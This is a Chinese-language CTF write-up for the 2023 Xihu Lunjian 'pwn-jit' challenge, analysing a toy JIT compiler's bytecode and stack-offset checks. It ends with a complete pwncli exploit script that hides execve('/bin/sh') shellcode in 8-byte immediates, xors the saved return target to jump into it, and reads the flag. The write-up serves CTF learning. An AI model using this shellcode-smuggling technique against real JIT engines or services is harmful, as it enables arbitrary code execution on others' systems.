# 2023西湖论剑初赛pwn-jit


> 一道`JIT`的题，记录一下。点击[链接](https://download.roderickchan.cn/ctf/2022/2023-xihulunjian-pwn-jit.7z)下载附件。若需要认证，下载账户名/密码为`roderick/rode@rick`。

<!--more-->

实现了一个简单的`JIT`引擎，并翻译了少量的字节码。

字节码：自定义的程序码，一般需要编译器翻译为机器码后再执行

机器码：`cpu`可以直接执行的程序码

# 题目分析

主要关注四个类和一个容器：

- `JITHelper`实现一些辅助功能，如初始化，写入机器码到`rwx`区域、结束清理

- `Compile`实现编译、解析、执行等功能
- `IRStream`实现字节码的读取和程序计数
- `AsmHelper`将字节码翻译为机器码
- `map`容器`Compiler::funcs`根据`id`存储每个函数的信息



## Compile::main

程序主要逻辑开始于`Compiler::main`函数，大概流程梳理如下。

- 初始化阶段，`exec`区域全部初始化为`0xcc`。

- 接着，往`exec`区域拷贝了语句，拷贝后区域的汇编代码如下：

```
0x7f7113500000    lea    rbp, [rsp - 8]
0x7f7113500005    call   0x7f711350000b
```

- 然后，在`Compiler::handleFn`中处理字节码。

- 处理完之后，在`JITHelper::finailize`会把`exec`区域权限改为`r-x`。

- 然后进行检查：`Compiler::funcs`必须存在`id`为`0`的函数，函数的`args`必须为`0`，`id`为`0`的函数必须第一个读入。不满足就退出执行。

- 接着，清零低地址的栈
- 最后，执行处于`exec`区域，翻译得到的机器码

![image-20230202211506189](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20230202211506189.png)



## Comile::handleFn

在一个循环中，使用`Compiler::handleFn`读取函数。

![image-20230202211914043](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20230202211914043.png)

每个函数有三个信息：

- `id`：唯一标识符
- `args`：参数个数
- `locals`：本地变量个数

创建函数的字节码如下：

```
0xff
id
args
locals
```

其中，`args <= 8`，`locals <= 0x20`。

创建完成后，往`exec`区域写入：

```
sub rsp, locals * 8
```

然后进入到`Compiler::handleFnBody`函数处理函数体。

最后调用`AsmHelper::func_ret`插入函数退出的机器码：

```
add rsp, 8 * locals
lea rdi, [rbp + retvar]
mov rsi, [rdi]
mov rax, rsi
ret
```



## Compile::handleFnBody

处理函数体。整理如下。

```
var2reg:
	lea rdi, [rbp + var]
	mov rsi, [rdi]

pvar2reg:
	lea rdi, [rbp + var]

regassign:
	mov [rdi], rsi

regaruth(0x21):
	and [rdi],rsi

regaruth(0x9):
	or [rdi],rsi

regaruth(0x31):
	xor [rdi],rsi

opcode  

0x0: 
	xx -> var2idx(xx1) var
	return var

0x1: 往栈上写值
	b_xx -> var2idx(xx1) var
	q_num # 8个字节
	
	mov rsi, q_num
	lea rdi, [rbp + var]
	mov [rdi], rsi
	
0x2: 栈上值转移
	b_xx_1 -> var2idx(xx1) var1
	b_xx_2 -> var2idx(xx2) var2
	
	lea rdi, [rbp + var1]
	mov rsi, [rdi]
	
	lea rdi, [rbp + var2]
	mov [rdi], rsi


0x3:
	b_xx_1 -> var2idx(xx1) var1
	b_xx_2 -> var2idx(xx2) var2
	
	lea rdi, [rbp + var2]
	mov rsi, [rdi]
	
	lea rdi, [rbp + var1]
	and [rdi], rsi
	
0x4:
	b_xx_1 -> var2idx(xx1) var1
	b_xx_2 -> var2idx(xx2) var2
	
	lea rdi, [rbp + var2]
	mov rsi, [rdi]
	
	lea rdi, [rbp + var1]
	or [rdi], rsi
	
0x5:
	b_xx_1 -> var2idx(xx1) var1
	b_xx_2 -> var2idx(xx2) var2
	
	lea rdi, [rbp + var2]
	mov rsi, [rdi]
	
	lea rdi, [rbp + var1]
	xor [rdi], rsi

0x6:
	b_xx_1 -> id
	b_xx_2 -> var2idx(xx2) retvar
	b_xx_3 -> args
	b_xx_n <- len(args)
	for x in xx_n:
		var2idx(xx_x) --> b_var_n
	
	push rbp
	sub rsp, 0x8 * len(args)
	for i, x in args:
		lea rdi, [rbp + x]
		mov rsi, [rdi]
		mov [rsp + -8 * i], rsi
	
	lea rbp, [rsp - 8]
	jmp id(func)
	pop rbp
	mov rsi, rax
	lea rdi, [rbp + retvar]
	mov [rdi], rsi
```



其中，由于题目限制，`0x6`字节码分支无法使用。只需要关注其他字节码即可。`var2idx`函数也需要关注。



## Compiler::var2idx

![image-20230202213030733](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20230202213030733.png)

该函数用于限制`lea rdi, [rbp +XX]`语句中的`XX`的范围。

当`args <= 8 && locals <= 0x20`的时候，`XX`范围为`[-0x80, 0x40]`，写个脚本打印出来：

```
var: 0x1, 8 * variable: 0x8
var: 0x2, 8 * variable: 0x10
var: 0x3, 8 * variable: 0x18
var: 0x4, 8 * variable: 0x20
var: 0x5, 8 * variable: 0x28
var: 0x6, 8 * variable: 0x30
var: 0x7, 8 * variable: 0x38
var: 0x8, 8 * variable: 0x40
var: 0x81, -8 * variable: -0x8
var: 0x82, -8 * variable: -0x10
var: 0x83, -8 * variable: -0x18
var: 0x84, -8 * variable: -0x20
var: 0x85, -8 * variable: -0x28
var: 0x86, -8 * variable: -0x30
var: 0x87, -8 * variable: -0x38
var: 0x88, -8 * variable: -0x40
var: 0x89, -8 * variable: -0x48
var: 0x8a, -8 * variable: -0x50
var: 0x8b, -8 * variable: -0x58
var: 0x8c, -8 * variable: -0x60
var: 0x8d, -8 * variable: -0x68
var: 0x8e, -8 * variable: -0x70
var: 0x8f, -8 * variable: -0x78
var: 0x90, -8 * variable: -0x80
var: 0xa0, -8 * variable: 0
```



# 利用思路

随便写个函数让`JIT`翻译执行，然后执行的时候看下栈的情况：

```
pwndbg> stack 30
00:0000│ rsp 0x7fff30421010 ◂— 0x0
01:0008│     0x7fff30421018 ◂— 0x0
02:0010│     0x7fff30421020 ◂— 0x0
03:0018│     0x7fff30421028 ◂— 0x0
04:0020│     0x7fff30421030 ◂— 0x0
05:0028│     0x7fff30421038 ◂— 0x0
06:0030│     0x7fff30421040 ◂— 0x0
07:0038│     0x7fff30421048 ◂— 0x0
08:0040│     0x7fff30421050 ◂— 0x0
09:0048│     0x7fff30421058 ◂— 0x0
0a:0050│     0x7fff30421060 ◂— 0x0
0b:0058│     0x7fff30421068 ◂— 0x0
0c:0060│     0x7fff30421070 ◂— 0x0
0d:0068│     0x7fff30421078 ◂— 0x0
0e:0070│ rdi 0x7fff30421080 —▸ 0x7fff304210a7 ◂— 0x7f711350000000
0f:0078│     0x7fff30421088 ◂— 0xc2a09b22b220ad00
10:0080│ rbp 0x7fff30421090 —▸ 0x7f711350000a ◂— hlt
```

此时，`[rbp]`指向的内容是`exec+0xa`，并且函数调用结束后，会`ret`到`0x7f711350000a`。

因此，修改掉`rbp`指向的内容为`exec + ??`，然后执行`shellcode`即可。

用什么存储`shellcode`呢，答案在`0x1`字节码。

```
0x1: 往栈上写值
	b_xx -> var2idx(xx1) var
	q_num # 8个字节
	
	mov rsi, q_num
	lea rdi, [rbp + var]
	mov [rdi], rsi
```

可以在`q_num`里面存`shellcode`，然后借助`jmp short`跳转执行即可。

所以，最终的思路如下：

- 借助`and/or/xor`操作修改`qword ptr [rbp]`的内容
- 借助`mov rsi, q_num`中的`q_num`跳转执行`shellcode`

# EXP

```python
#!/usr/bin/env python3
# Date: 2023-02-02 22:01:52
# Link: https://github.com/RoderickChan/pwncli
# Usage:
#     Debug : python3 exp.py debug elf-file-path -t -b malloc
#     Remote: python3 exp.py remote elf-file-path ip:port

from pwncli import *
from types import MappingProxyType

cli_script()

_d = {
-8 * k : v + 0x80 for k, v in zip(range(0x11), range(0x11))
}
_d[0] = 0xa0
dis2avr = MappingProxyType(_d)

payload = b""
def start_func(id, args, locals):
    global payload
    payload += p8(0xff) + p8(id) + p8(args) + p8(locals)

def mov_num2stack(dis, num):
    global payload
    payload += p8(1) + p8(dis2avr[dis]) + p64(num)

def mov_stack1_to_stack2(dis1, dis2):
    global payload
    payload += p8(2) + p8(dis2avr[dis1]) + p8(dis2avr[dis2])

def mov_stack1_and_stack2(dis1, dis2):
    global payload
    payload += p8(3) + p8(dis2avr[dis1]) + p8(dis2avr[dis2])

def mov_stack1_or_stack2(dis1, dis2):
    global payload
    payload += p8(4) + p8(dis2avr[dis1]) + p8(dis2avr[dis2])

def mov_stack1_xor_stack2(dis1, dis2):
    global payload
    payload += p8(5) + p8(dis2avr[dis1]) + p8(dis2avr[dis2])

def end_func(dis):
    global payload
    payload += p8(0) + p8(dis2avr[dis])


# args must be 0
start_func(0, 0, 0x20)

# 准备shellcode
# 可以利用rbx寄存器
# rbx -> exec+0xa
mov_num2stack(-0x20, u64("\x6A\x4d\x58\x48\x01\xC3".ljust(6, "\x90") + "\xeb\x09")) # push 0x4d; pop rax; add rbx, rax
mov_num2stack(-0x20, u64("\x48\x89\xDF".ljust(6, "\x90") + "\xeb\x09")) # mov rdi, rbx
mov_num2stack(-0x20, u64("\x31\xF6\x31\xD2".ljust(6, "\x90") + "\xeb\x09")) # xor esi, esi;xor edx, edx
mov_num2stack(-0x20, u64("\x31\xC0\xB0\x3B\x0F\x05".ljust(6, "\x90") + "\xeb\x09")) # xor eax, eax; mov al, 0x3b; syscall
mov_num2stack(-0x20, u64("/bin/sh\x00"))

# 修改[rbp]
mov_num2stack(-0x30, 0x1e)
mov_stack1_xor_stack2(0, -0x30)

end_func(0)

s(payload)

sleep(1)
sl("cat flag*")

ia()
```



---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2023-02-02-2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-jit/  

